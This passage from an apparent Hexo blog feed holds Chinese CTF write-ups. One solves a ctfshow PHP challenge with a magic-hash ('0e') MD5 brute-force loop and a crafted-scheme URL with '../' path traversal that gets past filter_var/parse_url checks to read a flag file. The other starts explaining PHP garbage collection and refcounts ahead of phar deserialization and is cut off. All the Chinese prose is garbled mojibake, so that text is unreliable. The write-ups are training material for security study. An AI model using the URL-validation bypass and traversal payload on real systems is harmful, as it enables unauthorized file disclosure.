class="token string single-quoted-string">'48399'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string single-quoted-string">'0e'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'$i = '</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$i</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'$c = '</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ËøêË°åÂæóÂà∞ÁªìÊûú<br><img src="https://img-blog.csdnimg.cn/24773c08bf7943759760909a91edf091.png" alt="2">b&#x3D;0e652024452&amp;c&#x3D;0e603448399</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hint.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">FILTER_VALIDATE_URL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token variable">$host</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfshow\.com$/'</span><span class="token punctuation">,</span><span class="token variable">$host</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Â∑ÆÁÇπÁÇπÂ∞±ÊàêÂäü‰∫ÜÔºÅ'</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string single-quoted-string">'please give me url!!!'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>filter_varÂáΩÊï∞Ôºö</p><blockquote><p>filter_var() ÂáΩÊï∞ÈÄöËøáÊåáÂÆöÁöÑËøáÊª§Âô®ËøáÊª§‰∏Ä‰∏™ÂèòÈáè„ÄÇ</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"someone@example....com"</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_EMAIL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"E-mail is not valid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"E-mail is valid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>‰ª£Á†ÅÁöÑËæìÂá∫Â¶Ç‰∏ãÊâÄÁ§∫Ôºö</p><blockquote><p>E-mail is not valid </p></blockquote><p><img src="https://img-blog.csdnimg.cn/c283211f432e4879a0d9d4b1c9c5f153.png" alt="1"><a href="https://www.runoob.com/php/php-ref-filter.html">ËØ¶ÊÉÖËØ∑ËßÅ</a></p><p>php‰ºöÂ∞Ü‰∏çËÆ§ËØÜÁöÑÂçèËÆÆÂΩìÊàêÁõÆÂΩï</p><blockquote><p>url&#x3D;hhh:&#x2F;&#x2F;ctfshow.com&#x2F;<br>ÊâìÂç∞Array ( [scheme] &#x3D;&gt; hhh [host] &#x3D;&gt; ctfshow.com [path] &#x3D;&gt; &#x2F; )<br>url&#x3D;hhh:&#x2F;&#x2F;ctfshow.com&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;fl0g.txt<br>ÊâìÂç∞Array ( [scheme] &#x3D;&gt; hhh [host] &#x3D;&gt; ctfshow.com [path] &#x3D;&gt; &#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;fl0g.txt ) ctfshow{91873400-0885-4a10-a7d9-75c9568f5e86} </p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Áü•ËØÜÁÇπ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpÁöÑÂûÉÂúæÂõûÊî∂(GC)Êú∫Âà∂‰ªãÁªç‰ª•ÂèäÂú®pharÂèçÂ∫èÂàóÂåñ‰∏≠ÁöÑ‰∏Ä‰∫õÂà©Áî®</title>
      <link href="/2023/07/17/php%E7%9A%84%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6-GC-%E6%9C%BA%E5%88%B6%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E5%9C%A8phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%88%A9%E7%94%A8/"/>
      <url>/2023/07/17/php%E7%9A%84%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6-GC-%E6%9C%BA%E5%88%B6%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E5%9C%A8phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="phpÁöÑÂûÉÂúæÂõûÊî∂-GC-Êú∫Âà∂‰ªãÁªç‰ª•ÂèäÂú®pharÂèçÂ∫èÂàóÂåñ‰∏≠ÁöÑ‰∏Ä‰∫õÂà©Áî®"><a href="#phpÁöÑÂûÉÂúæÂõûÊî∂-GC-Êú∫Âà∂‰ªãÁªç‰ª•ÂèäÂú®pharÂèçÂ∫èÂàóÂåñ‰∏≠ÁöÑ‰∏Ä‰∫õÂà©Áî®" class="headerlink" title="phpÁöÑÂûÉÂúæÂõûÊî∂(GC)Êú∫Âà∂‰ªãÁªç‰ª•ÂèäÂú®pharÂèçÂ∫èÂàóÂåñ‰∏≠ÁöÑ‰∏Ä‰∫õÂà©Áî®"></a>phpÁöÑÂûÉÂúæÂõûÊî∂(GC)Êú∫Âà∂‰ªãÁªç‰ª•ÂèäÂú®pharÂèçÂ∫èÂàóÂåñ‰∏≠ÁöÑ‰∏Ä‰∫õÂà©Áî®</h2><h2 id="ÊûêÊûÑÂáΩÊï∞-destruct"><a href="#ÊûêÊûÑÂáΩÊï∞-destruct" class="headerlink" title="ÊûêÊûÑÂáΩÊï∞__destruct()"></a>ÊûêÊûÑÂáΩÊï∞__destruct()</h2><p>ÂΩì‰∏Ä‰∏™Á®ãÂ∫èÁªìÊùüÂêéphp‰ºöËá™Âä®ÈîÄÊØÅÔºåÊúÄÂêéÂÜçË∞ÉÁî®‰∏ÄÊ¨°<code>__destruct()</code>„ÄÇ‰πüÂ∞±ÊòØËØ¥ÂàõÂª∫‰∫Ü‰∏Ä‰∏™ÂØπË±°ÁöÑËØùÔºåÁ®ãÂ∫èÁªìÊùüÂêéÂ∞±‰ºöË¢´ÈîÄÊØÅÔºåÂú®ÁªìÊùüÊó∂‰ºöË∞ÉÁî®‰∏ÄÊ¨°‰ª•‰∏ä<code>__destruct()</code>„ÄÇÂ¶ÇÊûúË¶ÅËß¶Âèë<code>__destruct()</code>ÁöÑËØùÔºåË¶Å‰πàÂØπË±°‰∏∫<code>null</code>,Ë¶Å‰πàphpÁöÑÁîüÂëΩÂë®ÊúüÁªìÊùüÔºåË¶Å‰πàÁªôÂÆöÁöÑÂèòÈáèË¢´unset()ÈîÄÊØÅ„ÄÇÈÇ£‰πàÂ¶ÇÊûúÁ®ãÂ∫èËøòÊ≤°ÊúâËøêË°åÁªìÊùüÁöÑËØùÔºåÂú®ËøêË°å‰∏≠ÊäõÂá∫ÂºÇÂ∏∏ÊàñËÄÖÁ®ãÂ∫èÊä•ÈîôÂàô‰∏ç‰ºöËß¶Âèë<code>__destruct()</code>ÔºåËøôÈáåÂ∞±Ë¶ÅÊèêÂà∞GCÂõûÊî∂Êú∫Âà∂„ÄÇ</p><h2 id="GCÊú∫Âà∂ÂÆòÊñπÊñáÊ°£"><a href="#GCÊú∫Âà∂ÂÆòÊñπÊñáÊ°£" class="headerlink" title="GCÊú∫Âà∂ÂÆòÊñπÊñáÊ°£"></a>GCÊú∫Âà∂<a href="https://www.php.net/manual/zh/features.gc.php">ÂÆòÊñπÊñáÊ°£</a></h2><p>‰πüÂ∞±ÊòØÂûÉÂúæÂõûÊî∂Êú∫Âà∂ÔºåÂú®phpÔºåpythonÔºåjavaÔºåc# Á≠â‰∏≠ÈÉΩÊúâÂ≠òÂú®„ÄÇ</p><p>GCÊú∫Âà∂ÔºåËÉΩÂ§üÈîÄÊØÅÂÜÖÂ≠òÁ©∫Èó¥ÔºåÈò≤Ê≠¢ÂÜÖÂ≠òÊ∫¢Âá∫ÔºåÂú®PHP‰∏≠‰ΩøÁî®<strong>ÂºïÁî®ËÆ°Êï∞</strong>Âíå<strong>ÂõûÊî∂Âë®Êúü</strong>Êù•Ëá™Âä®ÁÆ°ÁêÜÂÜÖÂ≠òÂØπË±°ÔºåÂΩì‰∏Ä‰∏™ÂèòÈáèË¢´ËÆæÁΩÆ‰∏∫NULLÊàñËÄÖÊ≤°ÊúâÊåáÈíàÊåáÂêëÊó∂ÂÆÉÂ∞±‰ºöÂèòÊàêÂûÉÂúæË¢´GCÊú∫Âà∂Ëá™Âä®ÂõûÊî∂ÊéâÔºõÂΩìÂØπË±°Ê≤°ÊúâË¢´ÂºïÁî®Êó∂Ôºå‰πü‰ºöË¢´ÂõûÊî∂ÔºåÂú®Ëøô‰∏™ËøáÁ®ã‰∏≠Ôºå‰ºöËá™Âä®Ë∞ÉÁî®ÂØπË±°‰∏≠ÁöÑ<code>__destruct()</code>„ÄÇ</p><h3 id="ÂºïÁî®ËÆ°Êï∞"><a href="#ÂºïÁî®ËÆ°Êï∞" class="headerlink" title="ÂºïÁî®ËÆ°Êï∞"></a>ÂºïÁî®ËÆ°Êï∞</h3><p>ÊØè‰∏Ä‰∏™phpÂèòÈáèÂ≠òÂú®‰∏Ä‰∏™Âè´ÂÅözvalÁöÑÂèòÈáèÂÆπÂô®Ôºå‰∏Ä‰∏™zvalÂèòÈáèÂÆπÂô®ÂåÖÂê´ÂèòÈáèÁöÑÁ±ªÂûãÂíåÂÄºÔºåËøòÂåÖÊã¨‰∏§‰∏™Â≠óËäÇÁöÑÈ¢ùÂ§ñ‰ø°ÊÅØ‚Äî<code>is_ref</code>Âíå<code>refcount</code>„ÄÇ</p><p><code>is_ref</code>ÊòØ‰∏™boolÂÄºÔºåÁî®Êù•Ê†áËØÜÂèòÈáèÊòØÂê¶ÊòØÂºïÁî®ÈõÜÂêàÔºåÈÄöËøáËøô‰∏™Â≠óËäÇÔºåphpÂºïÊìéÊâçÂèØ‰ª•ÊääÊôÆÈÄöÂèòÈáèÂíåÂºïÁî®ÂèòÈáèÂå∫ÂàÜÂºÄÊù•„ÄÇphpÂÆÉÂÖÅËÆ∏Áî®Êà∑ÈÄöËøá<code>&amp;</code>Êù•Ëá™ÂÆö‰πâÂºïÁî®ÔºåÂπ∂‰∏îzvalÂèòÈáèÂÆπÂô®‰∏≠ËøòÊúâ‰∏Ä‰∏™ÂÜÖÈÉ®ÂºïÁî®ËÆ°Êï∞Êú∫Âà∂Áî®Êù•‰ºòÂåñÂÜÖÂ≠òÁöÑ‰ΩøÁî®„ÄÇ</p><p><code>refcount</code>Ë°®Á§∫ÊúâÂ§öÂ∞ë‰∏™ÂèòÈáèÂêçÊåáÂêëzvalÂÆπÂô®Ôºå‰πüÂ∞±ÊòØÊåáÂêëËøô‰∏™zvalÂèòÈáèÂÆπÂô®ÁöÑÂèòÈáè‰∏™Êï∞„ÄÇ</p><p>Êàë‰ª¨ÂèØ‰ª•‰ΩøÁî®xdebugÊù•Ê£ÄÊü•ÂºïÁî®ËÆ°Êï∞ÁöÑÊÉÖÂÜµ<br> <img src="https://img-blog.csdnimg.cn/32b4413f344d4a71bbdaed0f95532c0b.png" alt="1"></p><p>ÂºïÁî®‰æãÂ≠êÔºö</p><p>Âú®php5.6.9‰∏ãËøêË°å</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"new string"</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'a'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">unset</span><span class="token punctuation">(</span> <span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$c</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ÈîÄÊØÅ$b,$cÂèòÈáè</span><span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'a'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">;</span><span class="token comment">//ÂºïÁî®ÂèòÈáè</span><span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Âú®php5.6.9‰∏ãËøêË°åÂæóÂà∞ÁªìÊûú</p><blockquote><p>a: (refcount&#x3D;3, is_ref&#x3D;0)&#x3D;‚Äònew string‚Äô<br> a: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‚Äònew string‚Äô&#x2F;&#x2F;b,b,cË¢´ÈîÄÊØÅÂêéÂ∞±Ââ©‰∏Ä‰∏™aÊåáÂêëzvalÂÆπÂô®a:(refcount&#x3D;2,isref&#x3D;1)&#x3D;‚Ä≤newstring‚Ä≤&#x2F;&#x2F;aÊåáÂêëzvalÂÆπÂô®a:(refcount&#x3D;2,isr‚Äãef&#x3D;1)&#x3D;‚Ä≤newstring‚Ä≤&#x2F;&#x2F;bÂºïÁî®‰∫ÜaÁöÑÂú∞ÂùÄÔºåÈÇ£‰πàaÁöÑÂú∞ÂùÄÔºåÈÇ£‰πàbÂ∞±ÊòØÂºïÁî®ÂèòÈáè</p></blockquote><p>Âú®php7.3.4‰∏ãËøêË°åÂæóÂà∞ÁªìÊûú</p><blockquote><p>a: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‚Äònew string‚Äô<br> a: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‚Äònew string‚Äô<br> a: (refcount&#x3D;2, is_ref&#x3D;1)&#x3D;‚Äònew string‚Äô&#x2F;&#x2F;bÂºïÁî®‰∫ÜbÂºïÁî®‰∫ÜaÁöÑÂú∞ÂùÄÔºåÈÇ£‰πà$bÂ∞±ÊòØÂºïÁî®ÂèòÈáè</p></blockquote><p>Ê≥®ÊÑèÔºö</p><p>Âú®php7ÂºÄÂßãÔºå$c &#x3D; $b &#x3D; $a‰πãÂêéaÁöÑÂºïÁî®ÂèòÈáè‰πüÊòØ1„ÄÇ</p><p>Âú®PHP 7‰∏≠ÔºåzvalÂèØ‰ª•Ë¢´ÂºïÁî®ËÆ°Êï∞Êàñ‰∏çË¢´ÂºïÁî®ÔºåÂú®zvalÁªìÊûÑ‰∏≠Êúâ‰∏Ä‰∏™Ê†áÂøóÁ°ÆÂÆö‰∫ÜËøô‰∏ÄÁÇπ„ÄÇ</p><p>‚ë†ÂØπ‰∫énullÔºåboolÔºåintÂíådoubleÁöÑÁ±ªÂûãÂèòÈáèÔºårefcount‰∏ç‰ºöËÆ°Êï∞Ôºõ</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'a'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'b'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'c'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$d</span><span class="token operator">=</span><span class="token number">1.1</span><span class="token punctuation">;</span><span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'d'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>php7.3.4ËøêË°åÁªìÊûúÔºö</p><blockquote><p>a: (refcount&#x3D;0, is_ref&#x3D;0)&#x3D;NULL<br> b: (refcount&#x3D;0, is_ref&#x3D;0)&#x3D;TRUE<br> c: (refcount&#x3D;0, is_ref&#x3D;0)&#x3D;1<br> d: (refcount&#x3D;0, is_ref&#x3D;0)&#x3D;1.1</p><p>refcountÂÄºÈÉΩ‰∏∫0</p></blockquote><p>php5.6.9ËøêË°åÁªìÊûú</p><blockquote><p>a: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;NULL<br> b: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;TRUE<br> c: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;1<br> d: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;1.1</p><p>refcountÂÄºÈÉΩ‰∏∫1</p></blockquote><p>‚ë°ÂØπ‰∫éÂØπË±°ÔºårefcountËÆ°Êï∞Âíåphp5ÁöÑ<strong>‰∏ÄËá¥</strong>Ôºõ</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">sd</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$s</span><span class="token operator">=</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">sd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token punctuation">;</span><span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>php7.3.4ËøêË°åÁªìÊûúÔºö</p><blockquote><p>a: (refcount&#x3D;2, is_ref&#x3D;0)&#x3D;class sd { public $s &#x3D; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‚Äò1‚Äô }</p></blockquote><p>php5.6.9ËøêË°åÁªìÊûúÔºö</p><blockquote><p>a: (refcount&#x3D;2, is_ref&#x3D;0)&#x3D;class sd { public $s &#x3D; (refcount&#x3D;2, is_ref&#x3D;0)&#x3D;‚Äò1‚Äô }</p><p>ÂèØ‰ª•ÂèëÁé∞Ôºå‰∏§‰∏™refcountÁªìÊûú‰∏ÄÊ†∑</p></blockquote><p>‚ë¢ÂØπ‰∫éÂ≠óÁ¨¶‰∏≤;</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"new string"</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'a'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">unset</span><span class="token punctuation">(</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'a'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">;</span><span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'a'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>php7.3.4ËøêË°åÁªìÊûúÔºö</p><blockquote><p>a: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‚Äònew string‚Äô<br> a: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‚Äònew string‚Äô<br> a: (refcount&#x3D;2, is_ref&#x3D;1)&#x3D;‚Äònew string‚Äô</p></blockquote><p>php5.6.9ËøêË°åÁªìÊûúÔºö</p><blockquote><p>a: (refcount&#x3D;2, is_ref&#x3D;0)&#x3D;‚Äònew string‚Äô<br> a: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‚Äònew string‚Äô<br> a: (refcount&#x3D;2, is_ref&#x3D;1)&#x3D;‚Äònew string‚Äô</p></blockquote><p>‚ë£ÂØπ‰∫éÊï∞ÁªÑÔºåÊú™ÂºïÁî®ÁöÑÂèòÈáèË¢´Áß∞‰∏∫‚Äú‰∏çÂèØÂèòÊï∞ÁªÑ‚Äù„ÄÇÂÖ∂Êï∞ÁªÑÊú¨Ë∫´ËÆ°Êï∞‰∏éphp5‰∏ÄËá¥Ôºå‰ΩÜÊòØÊï∞ÁªÑÈáåÈù¢ÁöÑÊØè‰∏™ÈîÆÂÄºÂØπÁöÑËÆ°Êï∞ÔºåÂàôÊåâÂâçÈù¢‰∏âÊù°ÁöÑËßÑÂàôÔºõ</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'c'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$d</span><span class="token operator">=</span><span class="token variable">$c</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">;</span><span class="token comment">//Êï∞ÁªÑÂÄºÊîπÂèò‰ª•ÂêéÔºå‰πãÂâçÁöÑÂºïÁî®ÂÖ®ÈÉ®Â∫üÂºÉÔºåÈáçÊñ∞ËÆ°ÁÆó</span><span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'c'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>php7.3.4ËøêË°åÁªìÊûúÔºö</p><blockquote><p>c: (refcount&#x3D;2, is_ref&#x3D;0)&#x3D;array (0 &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‚Äòa‚Äô, 1 &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‚Äòb‚Äô)<br> c: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;array (0 &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‚Äòa‚Äô, 1  &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‚Äòb‚Äô, 2 &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‚Äòc‚Äô)</p></blockquote><p>php5.6.9ËøêË°åÁªìÊûúÔºö</p><blockquote><p>c: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;array (0 &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‚Äòa‚Äô, 1 &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‚Äòb‚Äô)<br> c: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;array (0 &#x3D;&gt; (refcount&#x3D;2, is_ref&#x3D;0)&#x3D;‚Äòa‚Äô, 1  &#x3D;&gt; (refcount&#x3D;2, is_ref&#x3D;0)&#x3D;‚Äòb‚Äô, 2 &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;‚Äòc‚Äô)</p></blockquote><p><img src="https://img-blog.csdnimg.cn/22e913ea4a704047b26b0700fbfbafba.png" alt="1"></p><h3 id="ÂõûÊî∂Âë®Êúü"><a href="#ÂõûÊî∂Âë®Êúü" class="headerlink" title="ÂõûÊî∂Âë®Êúü"></a>ÂõûÊî∂Âë®Êúü</h3><p>phpÁöÑÂûÉÂúæÂõûÊî∂Êú∫Âà∂ÊòØÈªòËÆ§ÊâìÂºÄÁöÑÔºåÂú®php.ini‰∏≠ÂèØ‰ª•‰øÆÊîπÂÆÉ<code>zend.enable_gc</code>ÔºåÊàñËÄÖÂú®ËøêË°åphpÊó∂ÂàÜÂà´Ë∞ÉÁî®gc_enable() Âíå gc_disable()ÂáΩÊï∞Êù•ÊâìÂºÄÂíåÂÖ≥Èó≠ÂûÉÂúæÂõûÊî∂Êú∫Âà∂„ÄÇ</p><p><img src="https://img-blog.csdnimg.cn/612b08fded7346268103c89b188ad14a.png" alt="ËØ∑Ê∑ªÂä†ÂõæÁâáÊèèËø∞"></p><p>È¶ñÂÖàÔºåÈúÄË¶ÅÁ°ÆÁ´ã‰∏Ä‰∫õÂü∫Êú¨ËßÑÂàô„ÄÇÂ¶ÇÊûú refcount <strong>Â¢ûÂä†</strong>ÔºåÂàôËØ•ÂèòÈáè‰ªçÂú®‰ΩøÁî®‰∏≠ÔºåÂõ†Ê≠§‰∏çÊòØÂûÉÂúæ„ÄÇÂ¶ÇÊûú refcount    <strong>ÂáèÂ∞ëÂà∞ 0</strong>ÔºåÂàô zval 